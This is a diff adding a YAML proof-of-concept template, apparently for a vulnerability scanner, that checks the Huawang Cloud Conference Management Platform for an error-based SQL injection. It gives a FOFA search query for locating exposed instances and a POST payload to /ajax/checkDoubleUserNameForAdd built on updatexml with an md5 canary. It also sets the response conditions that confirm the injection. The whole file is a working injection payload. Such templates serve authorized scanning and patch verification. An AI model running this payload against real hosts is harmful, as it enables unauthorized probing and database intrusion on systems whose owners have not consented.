@@ -1,0 +1,20 @@
+id: poc-yaml-hwactive-checkdoubleusernameforadd-sqli
+info:
+  name: 华望云会议管理平台 checkDoubleUserNameForAdd SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 华望云会议管理平台
+  fofa: title="华望云会议管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajax/checkDoubleUserNameForAdd
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5({{.t1}}))),1))+and+'%25%25'+like+'
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,"java.sql.SQLException")
+    && (contains(body,t2) || contains(body,substr(t2,0,31)))
+transport: http
